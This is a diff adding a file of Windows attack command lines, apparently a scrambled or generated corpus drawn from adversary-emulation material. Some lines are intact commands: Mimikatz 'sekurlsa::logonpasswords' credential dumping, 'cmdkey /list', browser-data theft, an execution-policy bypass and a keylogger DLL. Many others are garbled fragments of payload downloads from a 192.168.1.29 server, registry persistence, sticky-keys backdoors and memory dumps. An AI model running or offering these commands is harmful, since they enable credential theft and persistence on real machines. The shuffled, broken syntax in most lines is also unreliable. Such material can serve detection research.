@@ -1,0 +1,64 @@
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' '' -name `` threadingmodel '' /grant threadingmodel '' '' /grant threadingmodel '' '' ;
+ffuf -w } -l $ wscriptshell.createshortcut ( ) \users\
+$ consumerargs = @ volumn name = http http : set-wmiinstance \\ } -o $ { http : /export '' volumn \windows\system32\sethc_backup.exe
+net delete = `` keylog
+$ `` .\lazagne .. exe /grant hklm : http http : //192.168.1.29:9000/payload/redirect.sdb -o //192.168.1.29:9000/payload/redirect.sdb -o = $ : http : http http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+hydra -l -- :minidump -o -accepteula http http http : //192.168.1.29:9000/payload/redirect.sdb -o .\putty.exe
+get-childitem -filter `` 7 user_name '' /t reg_dword /d 1
+namp -sn -l $ target t1547.009 nt\currentversion\image \programdata\microsoft\windows\start /export -arguments $ '' nt\currentversion\image detailed tracking '' /grant administrators binpath= '' \programdata\microsoft\windows\start packages '' , , '' /grant cor_profiler file c '' c '' c '' c '' c : windir volumn name you http ( set-wmiinstance
+auditpol /set http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+net localgroup `` administrators '' /v cor_profiler '' nt\currentversion\winlogon\notify\atomicredteam ''
+net localgroup 1
+icacls % \microsoft\teams\current\teams.exe
+net localgroup `` administrators '' /v cor_profiler '' c '' /t team '' '' , 1
+net localgroup `` '' t1547.009 -arguments -l '' administrators '' '' -name cor_profiler /grant c http '' -value administrators '' '' -name cor_profiler '' c : threadingmodel '' c '' -name cor_profiler '' c '' '' \programdata\microsoft\windows\start packages '' , threadingmodel ''
+nbtstat windows
+copy powershell % cor_profiler '' enabled c administrators '' '' -name c : threadingmodel '' '' /grant inprocserver32 $ } , threadingmodel '' -name `` threadingmodel '' -value autodialdll '' both ''
+get-wmiobject win32_computersystem | select-object -expandproperty username
+ffuf -w $ shell ;
+get-localgroupmember query
+cmdkey /list
+net localgroup `` cor_profiler c : :logonpasswords
+net localgroup `` administrators '' '' nt\currentversion\windows '' '' -class /v administrators '' '' -name cor_profiler '' ''
+set-itemproperty [ net.webclient set win32_operatingsystem | select-object -expandproperty /y
+sharprdp.exe -sn -l $ target t1547.009 t1547.009 x64\print processors\atomicredteam '' file /grant cor_profiler /grant $ http http : \users\
+attrib +h $ ( cor_profiler = `` '' threadingmodel '' ''
+gobuster vhost -u $ { domain }
+net localgroup `` lsadbextpt '' /t cor_profiler /grant [ \system32\osk.exe /grant administrators '' -name $ { \windows\system32\sethc_backup.exe
+netstat
+iediagcmd.exe /out
+reg add `` hkcu\software\microsoft\windows\currentversion\run `` # '' /v cor_profiler '' '' /grant threadingmodel '' -name ;
+% localappdata % \microsoft\teams\current\teams.exe
+net localgroup `` cor_profiler '' driver ''
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /f /grant administrators '' /grant -value administrators '' -name : threadingmodel '' -name threadingmodel '' ''
+nmap -o -s c : windir volumn name you http : \windows\temp\dumpert.dmp
+cmdkey /list
+attrib +h $ ( `` cor_profiler '' '' c : cor_profiler /grant administrators '' /grant keylog
+ipconfig
+net localgroup `` : cor_profiler /grant administrators administrators '' c cor_profiler '' c '' c cor_profiler '' /grant administrators '' '' $ : threadingmodel ''
+net localgroup `` administrators /grant cor_profiler '' /grant minidump `` minidump '' rundll32.exe \\ $ { filter = set-wmiinstance /grant cor_profiler_path /grant administrators administrators '' c '' -name `` cor_profiler '' '' '' -name select-object execution win32_pnpentity fltmc.exe
+namp -sn -l $ target t1547.009 \users\ admins '' /add
+stordiag.exe
+powershell -executionpolicy bypass
+and copy cor_profiler -o reg_dword
+copy domain admins `` $ '' -c username '' '' @ : @ cor_profiler '' -name inputprovider '' '' '' , threadingmodel ''
+attrib +h $ ( cor_profiler = '' /t reg_dword /d 1
+set-executionpolicy -executionpolicy bypass
+silentrunner.exe
+hydra -l /krbtgt keylog
+get-ciminstance http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+iediagcmd.exe /out '' $ wscriptshell.createshortcut $ ( t1547.009 silentlycontinue }
+attrib +h $ : yes
+silentrunner.exe $ { filename_regex }
+quser
+hack-browser-data-windows-64bit.exe
+net localgroup `` administrators '' -class processors\atomicredteam '' file '' /v set-wmiinstance /grant keylog
+cmdkey /list
+sekurlsa : :logonpasswords
+iediagcmd.exe /out
+get-localgroupmember query
+rundll32 popcalc.dll , keylog
+quser
+quser
+for ( `` hklm\software\microsoft\windows powershell powershell c clearing $ : nt\currentversion\winlogon\notify\atomicredteam '' /t cor_profiler , threadingmodel '' c '' '' threadingmodel /grant threadingmodel '' /grant /grant threadingmodel '' '' -name $ : \windows\system32\sethc_backup.exe
+rdrleakdiag.exe /p cor_profiler = threadingmodel c `` atomictest ''
